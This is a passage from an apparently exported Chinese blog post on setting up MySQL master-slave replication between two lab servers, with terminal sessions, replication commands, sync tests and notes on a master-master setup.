mysql&gt;&#xA0;show&#xA0;variables&#xA0;like&#xA0;&apos;%version%&apos;; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;Variable_name&#xA0;|&#xA0;Value&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;innodb_version&#xA0;|&#xA0;5.7.19&#xA0;| |&#xA0;protocol_version&#xA0;|&#xA0;10&#xA0;| |&#xA0;slave_type_conversions&#xA0;|&#xA0;| |&#xA0;tls_version&#xA0;|&#xA0;TLSv1,TLSv1.1&#xA0;| |&#xA0;version&#xA0;|&#xA0;5.7.19&#x2010;log&#xA0;| |&#xA0;version_comment&#xA0;|&#xA0;Source&#xA0;distribution&#xA0;| |&#xA0;version_compile_machine&#xA0;|&#xA0;x86_64&#xA0;| |&#xA0;version_compile_os&#xA0;|&#xA0;Linux&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 8&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.01&#xA0;sec) mysql&gt;[root@MySQL2&#xA0;mysql]#&#xA0;mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;pJaking@vip.163.com mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure. Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g. Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;6 Server&#xA0;version:&#xA0;5.7.19&#xA0;Source&#xA0;distribution Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved. Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective owners. Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement. mysql&gt;&#xA0;show&#xA0;variables&#xA0;like&#xA0;&apos;%version%&apos;; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;Variable_name&#xA0;|&#xA0;Value&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ |&#xA0;innodb_version&#xA0;|&#xA0;5.7.19&#xA0;| |&#xA0;protocol_version&#xA0;|&#xA0;10&#xA0;| |&#xA0;slave_type_conversions&#xA0;|&#xA0;| |&#xA0;tls_version&#xA0;|&#xA0;TLSv1,TLSv1.1&#xA0;| |&#xA0;version&#xA0;|&#xA0;5.7.19&#xA0;| |&#xA0;version_comment&#xA0;|&#xA0;Source&#xA0;distribution&#xA0;| |&#xA0;version_compile_machine&#xA0;|&#xA0;x86_64&#xA0;| |&#xA0;version_compile_os&#xA0;|&#xA0;Linux&#xA0;| +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 8&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.02&#xA0;sec) mysql&gt;&#xA0;exit Bye &#x6D4B;&#x8BD5;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x662F;&#x5426;&#x6210;&#x529F; 123456789101112131415161718192021[root@MySQL2&#xA0;mysql]#&#xA0;mysql -uslave -pJaking@vip.163.com -h 192.168.10.67mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g.Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;5Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distributionCopyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;itsaffiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respectiveowners.Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement.mysql&gt;&#xA0;show&#xA0;databases;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+|&#xA0;Database&#xA0;|+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+|&#xA0;information_schema&#xA0;|+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+1&#xA0;row&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec) #&#x6B64;&#x65F6;&#x770B;&#x4E0D;&#x5230; TESTDB &#x6570;&#x636E;&#x5E93;&#x5C5E;&#x6B63;&#x5E38;&#x73B0;&#x8C61; &#x5411;TESTDB&#x6570;&#x636E;&#x5E93;&#x5BFC;&#x5165;&#x6570;&#x636E; 1234567891011121314151617181920212223242526272829303132333435363738394041424344[root@MySQL2&#xA0;~]#&#xA0;mysql -uroot -pJaking@vip.163.com &lt; TESTDB.sql mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.[root@MySQL2&#xA0;~]#&#xA0;mysql -uroot -pJaking@vip.163.commysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g.Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;11Server&#xA0;version:&#xA0;5.7.19&#xA0;Source&#xA0;distributionCopyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;itsaffiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respectiveowners.Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement.mysql&gt;&#xA0;show&#xA0;databases;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+|&#xA0;Database&#xA0;|+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+|&#xA0;information_schema&#xA0;||&#xA0;TESTDB&#xA0;||&#xA0;mysql&#xA0;||&#xA0;performance_schema&#xA0;||&#xA0;sys&#xA0;|+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+5&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec)mysql&gt;&#xA0;use&#xA0;TESTDB;Reading&#xA0;table&#xA0;information&#xA0;for&#xA0;completion&#xA0;of&#xA0;table&#xA0;and&#xA0;column&#xA0;namesYou&#xA0;can&#xA0;turn&#xA0;off&#xA0;this&#xA0;feature&#xA0;to&#xA0;get&#xA0;a&#xA0;quicker&#xA0;startup&#xA0;with&#xA0;&#x2010;ADatabase&#xA0;changedmysql&gt;&#xA0;show&#xA0;tables;+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+|&#xA0;Tables_in_TESTDB&#xA0;|+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+|&#xA0;table666&#xA0;|+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+1&#xA0;row&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec)mysql&gt;&#xA0;exitBye &#x6307;&#x5B9A;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x91CD;&#x542F;slave12345678910111213141516171819202122232425262728293031323334353637[root@MySQL2&#xA0;~]#&#xA0;mysql -uroot -pJaking@vip.163.commysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g.Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;3Server&#xA0;version:&#xA0;5.7.19&#xA0;Source&#xA0;distributionCopyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;itsaffiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respectiveowners.Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement.mysql&gt;&#xA0;stop&#xA0;slave;Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected,&#xA0;1&#xA0;warning&#xA0;(0.00&#xA0;sec)mysql&gt;&#xA0;change&#xA0;master&#xA0;to master_host=&apos;192.168.10.67&apos;,master_user=&apos;slave&apos;,master_password=&apos;Jaking@vip.163.com&apos;;Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected,&#xA0;2&#xA0;warnings&#xA0;(0.00&#xA0;sec)mysql&gt;&#xA0;start&#xA0;slave;Query&#xA0;OK,&#xA0;0&#xA0;rows&#xA0;affected&#xA0;(0.00&#xA0;sec)mysql&gt;&#xA0;show&#xA0;slave&#xA0;status\\G***************************&#xA0;1.&#xA0;row&#xA0;***************************Slave_IO_State:&#xA0;Waiting&#xA0;for&#xA0;master&#xA0;to&#xA0;send&#xA0;eventMaster_Host:&#xA0;192.168.10.67Master_User:&#xA0;slaveMaster_Port:&#xA0;3306Connect_Retry:&#xA0;60Master_Log_File:&#xA0;mysql&#x2010;bin&#x2010;master.000002Read_Master_Log_Pos:&#xA0;601Relay_Log_File:&#xA0;MySQL2&#x2010;relay&#x2010;bin.000003Relay_Log_Pos:&#xA0;828Relay_Master_Log_File:&#xA0;mysql&#x2010;bin&#x2010;master.000002Slave_IO_Running:&#xA0;YesSlave_SQL_Running:&#xA0;Yes Slave_IO_Running &#xFF1A;&#x4E00;&#x4E2A;&#x8D1F;&#x8D23;&#x4E0E;&#x4E3B;&#x673A;&#x7684;IO&#x901A;&#x4FE1;Slave_SQL_Running&#xFF1A;&#x8D1F;&#x8D23;&#x81EA;&#x5DF1;&#x7684;slave mysql&#x8FDB;&#x7A0B;&#x4E24;&#x4E2A;&#x4E3A; Yes &#x5C31;&#x6210;&#x529F;&#x4E86;&#xFF01; &#x518D;&#x5230;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x4E0A;&#x67E5;&#x770B;&#x72B6;&#x6001; 1234567891011121314151617181920212223242526272829303132333435363738391 [root@MySQL1&#xA0;mysql&#x2010;5.7.19]#&#xA0;mysql&#xA0;&#x2010;uroot&#xA0;&#x2010;pJaking@vip.163.com2 mysql:&#xA0;[Warning]&#xA0;Using&#xA0;a&#xA0;password&#xA0;on&#xA0;the&#xA0;command&#xA0;line&#xA0;interface&#xA0;can&#xA0;be&#xA0;insecure.3 Welcome&#xA0;to&#xA0;the&#xA0;MySQL&#xA0;monitor.&#xA0;Commands&#xA0;end&#xA0;with&#xA0;;&#xA0;or&#xA0;\\g.4 Your&#xA0;MySQL&#xA0;connection&#xA0;id&#xA0;is&#xA0;75 Server&#xA0;version:&#xA0;5.7.19&#x2010;log&#xA0;Source&#xA0;distribution67 Copyright&#xA0;(c)&#xA0;2000,&#xA0;2017,&#xA0;Oracle&#xA0;and/or&#xA0;its&#xA0;affiliates.&#xA0;All&#xA0;rights&#xA0;reserved.89 Oracle&#xA0;is&#xA0;a&#xA0;registered&#xA0;trademark&#xA0;of&#xA0;Oracle&#xA0;Corporation&#xA0;and/or&#xA0;its10 affiliates.&#xA0;Other&#xA0;names&#xA0;may&#xA0;be&#xA0;trademarks&#xA0;of&#xA0;their&#xA0;respective11 owners.1213 Type&#xA0;&apos;help;&apos;&#xA0;or&#xA0;&apos;\\h&apos;&#xA0;for&#xA0;help.&#xA0;Type&#xA0;&apos;\\c&apos;&#xA0;to&#xA0;clear&#xA0;the&#xA0;current&#xA0;input&#xA0;statement.1415 mysql&gt;&#xA0;show&#xA0;processlist\\G16 ***************************&#xA0;1.&#xA0;row&#xA0;***************************17 &#xA0;Id:&#xA0;618 &#xA0;User:&#xA0;slave19 &#xA0;Host:&#xA0;192.168.10.68:5465620 &#xA0;db:&#xA0;NULL21 Command:&#xA0;Binlog&#xA0;Dump22 &#xA0;Time:&#xA0;16523 &#xA0;State:&#xA0;Master&#xA0;TESTDBs&#xA0;sent&#xA0;all&#xA0;binlog&#xA0;to&#xA0;slave;&#xA0;waiting&#xA0;for&#xA0;more&#xA0;updates24 &#xA0;Info:&#xA0;NULL25 ***************************&#xA0;2.&#xA0;row&#xA0;***************************26 &#xA0;Id:&#xA0;727 &#xA0;User:&#xA0;root28 &#xA0;Host:&#xA0;localhost29 &#xA0;db:&#xA0;NULL30 Command:&#xA0;Query31 &#xA0;Time:&#xA0;032 &#xA0;State:&#xA0;starting33 &#xA0;Info:&#xA0;show&#xA0;processlist34 2&#xA0;rows&#xA0;in&#xA0;set&#xA0;(0.00&#xA0;sec)3536 mysql&gt; &#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566[root@MySQL1 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 11Server version: 5.7.19-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys || testdb |+--------------------+5 rows in set (0.00 sec)mysql&gt; use testdb;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+------------------+| Tables_in_testdb |+------------------+| table666 |+------------------+1 row in set (0.00 sec)mysql&gt; select * from table666;Empty set (0.00 sec)mysql&gt; INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;Linux&apos;,&apos;66&apos;,&apos;DZ&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;CLD&apos;,&apos;68&apos;,&apos;RM&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;SYS&apos;,&apos;90&apos;,&apos;JX&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;MySQL1&apos;,&apos;71&apos;,&apos;QH&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;MySQL2&apos;,&apos;72&apos;,&apos;QH&apos;);INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;MySQL3&apos;,&apos;73&apos;,&apos;QH&apos;);mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH |+---------+--------+-------+------------+6 rows in set (0.00 sec)mysql&gt; ^DBye[root@MySQL1 ~]# 12345678910111213141516171819202122232425262728[root@MySQL2 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 9Server version: 5.7.19 MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; select * from testdb.table666;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH |+---------+--------+-------+------------+6 rows in set (0.00 sec)mysql&gt; &#x4E3B;&#x5E93; 1234567891011121314151617181920212223242526272829mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 6 | MySQL3 | 73 | QH |+---------+--------+-------+------------+6 rows in set (0.00 sec)mysql&gt; delete from table666 where bName=&quot;MySQL3&quot;;Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH |+---------+--------+-------+------------+5 rows in set (0.00 sec)mysql&gt; &#x4ECE;&#x5E93; 1234567891011mysql&gt; select * from testdb.table666;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH |+---------+--------+-------+------------+5 rows in set (0.00 sec) &#x4E3B;&#x5E93; 1234567891011121314151617181920212223242526272829mysql&gt; select * from table666;+---------+--------+-------+------------+| bTypeId | bName | price | publishing |+---------+--------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH |+---------+--------+-------+------------+5 rows in set (0.00 sec)mysql&gt; INSERT INTO table666(bTypeId,bName,price,publishing) VALUES(&apos;666&apos;,&apos;Linux666&apos;,&apos;666&apos;,&apos;QH&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from table666; +---------+----------+-------+------------+| bTypeId | bName | price | publishing |+---------+----------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 666 | Linux666 | 666 | QH |+---------+----------+-------+------------+6 rows in set (0.00 sec)mysql&gt; &#x4ECE;&#x5E93; 1234567891011121314mysql&gt; select * from testdb.table666;+---------+----------+-------+------------+| bTypeId | bName | price | publishing |+---------+----------+-------+------------+| 1 | Linux | 66 | DZ || 2 | CLD | 68 | RM || 3 | SYS | 90 | JX || 4 | MySQL1 | 71 | QH || 5 | MySQL2 | 72 | QH || 666 | Linux666 | 666 | QH |+---------+----------+-------+------------+6 rows in set (0.00 sec)mysql&gt; &#x81F3;&#x6B64;&#xFF0C;MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x642D;&#x5EFA;&#x6210;&#x529F;&#xFF01;&#x7EC3;&#x4E60;&#xFF1A;1. &#x914D;&#x7F6E;&#x4E92;&#x4E3A;&#x4E3B;&#x4ECE; 2. &#x5148;&#x914D;&#x7F6E;&#x5E38;&#x89C4;&#x4E3B;&#x4ECE;&#xFF0C;&#x7136;&#x540E;&#x589E;&#x52A0;&#x4E00;&#x53F0;&#x4ECE;&#x5E93;&#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x6587;&#x4EF6; master_1: bind-address = 0.0.0.0 # &#x542F;&#x7528;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5; log-bin=mysql-bin # &#x6B65;&#x8FDB;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x6709;n&#x53F0;master&#xFF0C;&#x5C31;&#x586B;n&#xFF1A; auto_increment_increment=2 # &#x8D77;&#x59CB;&#x503C;&#xFF0C;&#x4E00;&#x822C;&#x586B;&#x7B2C;n&#x53F0;master&#xFF0C;&#x8FD9;&#x91CC;&#x662F;&#x7B2C;1&#x53F0;&#x4E3B;MySQL auto_increment_offset=1 server-id=1 lower_case_table_names=1 master_2: auto_increment_increment=2 auto_increment_offset=2 log-bin=mysql-bin binlog_format=mixed server-id=2 lower_case_table_names=1 # &#x5BFC;&#x51FA;&#x6570;&#x636E;&#x5230;master_2master_1: mysqldump -uroot -p -A &gt; all_db.sql scp all_db.sql master_2_user@master_2_ipaddr:~/ master_2: mysql -uroot -p &lt; all.db.sql # &#x8BB0;&#x5F55;bin-log&#x6587;&#x4EF6;&#x8DDF;&#x4F4D;&#x7F6E;&#xFF0C;&#x5E76;&#x5C06;&#x5176;&#x6388;&#x6743;&#x7ED9;&#x5BF9;&#x65B9; #&#x4F8B;&#x5982;&#xFF1A;master_1: show master status; #&#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;master&#xFF1A;123456GRANT REPLICATION SLAVE ON *.* TO slave@&apos;master_2_ipaddr&apos; IDENTIFIED BY &#x2018;slave_password&#x2019;;STOP SLAVE;CHANGE MASTER TO master_host=&apos;master_2_ipaddr&apos;,master_user=&apos;slave&apos;,master_password=&apos;slave_password&apos;,master_log_file=&apos;mysql-bin.000005&apos;,master_log_pos=13756331;FLUSH PRIVILEGES;START SLAVE;SHOW SLAVE STATUS\\G master_2: &#x5C06;&#x81EA;&#x5DF1;&#x7684;bin-log&#x6587;&#x4EF6;&#x6388;&#x6743;&#x7ED9;&#x5176;&#x4ED6;maser1234567GRANT REPLICATION SLAVE ON *.* TO slave@&apos;master_1_ipaddr&apos; IDENTIFIED BY &#x2018;slave_password&#x2019;;FLUSH PRIVILEGES;STOP SLAVE;CHANGE MASTER TO master_host=&apos;master_1_ipaddr&apos;,master_user=&apos;slave&apos;,master_password=&apos;slave_password&apos;,master_log_file=&apos;mysql-bin.000001&apos;,mysql_log_pos=1022;FLUSH PRIVILEGES;START SLAVE;SHOW SLAVE STATUS\\G &#x53C2;&#x8003;&#xFF1A;https://www.smister.com/post-41/mysql-master-master.html # &#x5728;&#x539F;&#x6709;&#x4E3B;&#x4ECE;&#x4E0A; &#x65B0;&#x589E;&#x4ECE;&#x5E93; MySQL&#x4F20;&#x7EDF;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x4E4B;&#x4E0D;&#x505C;&#x673A;&#x91CD;&#x5EFA;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#xFF08;&#x5B9E;&#x6218;&#xFF09;https://note.youdao.com/s/bHvxKKyK document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL调优","date":"2022-06-07T04:44:39.000Z","path":"/posts/208cd020/","text":"&#x5B66;&#x4E60;&#x4E00;&#x4E2A;&#x670D;&#x52A1;&#x7684;&#x8FC7;&#x7A0B;&#xFF1A;1&#x3001; &#x6B64;&#x670D;&#x52A1;&#x5668;&#x7684;&#x6982;&#x8FF0;&#xFF1A;&#x540D;&#x79F0;&#xFF0C;&#x529F;&#x80FD;&#xFF0C;&#x7279;&#x70B9;&#xFF0C;&#x7AEF;&#x53E3;&#x53F7;2&#x3001; 